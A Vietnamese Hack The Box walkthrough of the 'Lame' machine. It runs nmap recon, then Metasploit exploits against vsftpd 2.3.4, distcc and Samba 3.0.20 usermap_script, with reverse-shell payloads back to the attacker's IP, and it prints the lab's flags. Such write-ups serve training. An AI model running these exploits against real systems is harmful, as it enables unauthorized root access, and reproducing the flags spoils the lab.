# Thông tin cơ bản 

![Logo](images/machine.png)

- Giới thiệu: Lame là một máy Linux dễ sử dụng, chỉ cần một lỗ hổng bảo mật duy nhất để có được quyền truy cập root. Đây là máy tính đầu tiên được phát hành trên Hack The Box và thường là máy tính đầu tiên dành cho người dùng mới trước khi ngừng hoạt động.
- Mức độ: Dễ 
- Nền tảng: Linux
- Công cụ: nmap, metasploit
# Recon 

## Liệt kê cổng mở 

> Quét các cổng dịch vụ phổ biến trên máy mục tiêu bằng nmap 

```Bash
nmap -sSVC -Pn lame.htb 
```

```bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-14 03:35 -0400
Nmap scan report for lame.htb (10.129.55.39)
Host is up (0.087s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.15.211
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 1h59m28s, deviation: 2h49m44s, median: -33s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: Sam
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2026-10-14T03:34:59-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.24 seconds
```

> Quét tất cả các cổng 

```bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-14 03:37 -0400
Nmap scan report for lame.htb (10.129.55.39)
Host is up (0.054s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.15.211
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2026-10-14T03:39:01-04:00
|_clock-skew: mean: 1h59m28s, deviation: 2h49m45s, median: -33s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 149.27 seconds
```

Kết quả 

| Port    | Service | Version                                      |
| ------- | ------- | -------------------------------------------- |
| 21      | FTP     | vsftpd 2.3.4                                 |
| 22      | SSH     | OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) |
| 139.445 | Samba   | 3.0.20-Debian                                |
| 3632    | distccd | distccd v1                                   |
## FTP 

> FTP có thiết lập đăng nhập ẩn danh nhưng không có thông tin gì 

```bash
└─$ ftp anonymous@lame.htb     
Connected to lame.htb.
220 (vsFTPd 2.3.4)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||21342|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> exit
221 Goodbye.
```

> FTP phiên bản vsFTPd 2.3.4 tồn tại 1 lỗ hổng bảo mật 
> https://www.exploit-db.com/exploits/49757
> Là 1 backdoor được chèn vào mã nguồn và nó mở 1 command shell không xác thực tại cổng 6200

## Samba 

> Liệt kê các thư mục có 2 thư mục nhưng không đem lại thông tin gì hữu ích 

```bash
└─$ smbclient --no-pass -L //lame.htb     
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME
                                  
```

> Samba phiên bản Samba 3.0.20 tồn tại 1 lỗ hổng bảo mật 
> https://nvd.nist.gov/vuln/detail/cve-2007-2447
> https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/
> Mô-đun này khai thác lỗ hổng thực thi lệnh trong các phiên bản Samba từ 3.0.20 đến 3.0.25rc3 khi sử dụng tùy chọn cấu hình "username map script" không mặc định. Bằng cách chỉ định tên người dùng chứa các ký tự meta của shell, kẻ tấn công có thể thực thi các lệnh tùy ý.
   Không cần xác thực để khai thác lỗ hổng này vì tùy chọn này được sử dụng để ánh xạ tên người dùng trước khi xác thực!

## Distccd

> Dịch vụ này cũng tồn tại 1 lỗ hổng bảo mật khiến dẫn đến có shell root
> https://nvd.nist.gov/vuln/detail/cve-2004-2687
> https://www.exploit-db.com/exploits/9915
> distcc 2.x, được sử dụng trong Xcode 1.5 và các phiên bản khác, khi không được cấu hình để hạn chế quyền truy cập vào cổng máy chủ, cho phép kẻ tấn công từ xa thực thi các lệnh tùy ý thông qua các tác vụ biên dịch, được máy chủ thực thi mà không cần kiểm tra quyền truy cập.

# Exploit

## FTP vsFTPd 2.3.4

> Khai thác lỗ hổng chèn backdoor trong mã nguồn của FTP bằng Metasploit

```bash
msf > search vsftpd 2.3.4

Matching Modules
================

   #  Full Name                             Disclosure Date  Rank       Check  Name
   -  ---------                             ---------------  ----       -----  ----
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

msf > use 0
[*] Using configured payload cmd/linux/http/x86/meterpreter_reverse_tcp
msf exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  lame.htb         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/linux/http/x86/meterpreter_reverse_tcp):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   EXTENSIONS                       no        Comma-separate list of extensions to load
   FETCH_COMMAND   CURL             yes       Command to fetch payload (Accepted: CURL, FTP, GET, TFTP, TNFTP, WGET)
   FETCH_DELETE    false            yes       Attempt to delete the binary after execution
   FETCH_FILELESS  none             yes       Attempt to run payload without touching disk by using anonymous handles, requires Linux ≥3.17 (for Python va
                                              riant also Python ≥3.8, tested shells are sh, bash, zsh) (Accepted: none, python3.8+, shell-search, shell)
   FETCH_SRVHOST                    no        Local IP to use for serving payload
   FETCH_SRVPORT   8080             yes       Local port to use for serving payload
   FETCH_URIPATH                    no        Local URI to use for serving payload
   LHOST           10.10.15.211     yes       The listen address (an interface may be specified)
   LPORT           4445             yes       The listen port


   When FETCH_COMMAND is one of CURL,GET,WGET:

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   FETCH_PIPE  false            yes       Host both the binary payload and the command so it can be piped directly to the shell.


   When FETCH_FILELESS is none:

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_FILENAME      hmlsLchbC        no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_WRITABLE_DIR  ./               yes       Remote writable dir to store payload; cannot contain spaces


Exploit target:

   Id  Name
   --  ----
   0   Linux/Unix Command



View the full module info with the info, or info -d command.

msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] Started reverse TCP handler on 10.10.15.211:4445 
[*] 10.129.55.39:21 - Running automatic check ("set AutoCheck false" to disable)
[*] 10.129.55.39:21 - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
[+] 10.129.55.39:21 - The target appears to be vulnerable. vsftpd 2.3.4 banner detected; backdoor may be present
[!] 10.129.55.39:21 - Unable to connect to backdoor on 6200/TCP. Cooldown?
[*] Exploit completed, but no session was created.
```

> Không thành công có vẻ lỗ hổng đã được vá và cổng 6200 bị lọc 

```
└─$ nmap -sV -p 21,6200 10.129.55.39
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-14 04:14 -0400
Nmap scan report for lame.htb (10.129.55.39)
Host is up (0.055s latency).

PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 2.3.4
6200/tcp filtered lm-x
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.86 seconds
```

## Distccd v1

> Khai thác lỗ hổng RCE bằng metasploit thành công trong việc thực thi mã 

```bash
msf exploit(unix/misc/distcc_exec) > options

Module options (exploit/unix/misc/distcc_exec):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   3632             yes       The target port (TCP)


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.122.39   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf exploit(unix/misc/distcc_exec) > set RHOSTS lame.htb
RHOSTS => lame.htb
msf exploit(unix/misc/distcc_exec) > set LHOST 10.10.15.211
LHOST => 10.10.15.211
msf exploit(unix/misc/distcc_exec) > options 

Module options (exploit/unix/misc/distcc_exec):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  lame.htb         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   3632             yes       The target port (TCP)


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.15.211     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf exploit(unix/misc/distcc_exec) > exploit
[*] Started reverse TCP handler on 10.10.15.211:4444 
[*] 10.129.55.39:3632 - stderr: bash: 155: Bad file descriptor
[*] 10.129.55.39:3632 - stderr: bash: /dev/tcp/10.10.15.211/4444: No such file or directory
[*] 10.129.55.39:3632 - stderr: bash: 155: Bad file descriptor
[*] Exploit completed, but no session was created.
msf exploit(unix/misc/distcc_exec) > check
[+] 10.129.55.39:3632 - The target is vulnerable. Remote code execution via distcc confirmed
msf exploit(unix/misc/distcc_exec) > set PAYLOAD cmd/unix/generic
PAYLOAD => cmd/unix/generic
msf exploit(unix/misc/distcc_exec) > set CMD id
CMD => id
msf exploit(unix/misc/distcc_exec) > run
[*] 10.129.55.39:3632 - stdout: uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

## Samba 3.0.20

> Khai thác lỗ hổng Samba 3.0.20 
> Lỗ hổng nghiêm trọng xảy ra do cách xử lý không an toàn đối với tham số `username map script` trong tệp cấu hình `smb.conf`

```bash
msf > search Samba 3.0.20

Matching Modules
================

   #  Full Name                           Disclosure Date  Rank       Check  Name
   -  ---------                           ---------------  ----       -----  ----
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

msf > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf exploit(multi/samba/usermap_script) > options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.122.39   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(multi/samba/usermap_script) > set RHOSTS 
RHOSTS => 
msf exploit(multi/samba/usermap_script) > set RHOSTS 10.129.55.39
RHOSTS => 10.129.55.39
msf exploit(multi/samba/usermap_script) > set LHOST 
LHOST => 192.168.122.39
msf exploit(multi/samba/usermap_script) > set LHOST 10.10.15.211
LHOST => 10.10.15.211
msf exploit(multi/samba/usermap_script) > set LPORT 4445
LPORT => 4445
msf exploit(multi/samba/usermap_script) > exploit
[*] Started reverse TCP handler on 10.10.15.211:4445 
[*] Command shell session 1 opened (10.10.15.211:4445 -> 10.129.55.39:44578) at 2026-10-14 05:09:51 -0400

whoami
root
id
uid=0(root) gid=0(root)
```
> Có được shell với đặc quyền root 

```user flag
4b54867e0f5845bc856ce7a581793813
```
```root
11297fe3e8faabb6bf3b5e60067e5af4
```

> Qua tìm hiểu ta cũng có thể thấy cổng 6200 bị chặn nên khi khai thác lỗ hổng backdoor FTP không thành công 

# Kết luận

* Phòng này ở mức độ dễ 
* Máy mục tiêu mở các dịch vụ FTP, Samba, Distcc 
* Cả 3 đều tồn tại lỗ hổng bảo mật nghiêm trọng có thể thực thi mã, xâm nhập máy 
* Cần cập nhật lên phiên bản mới để vá lỗ hổng 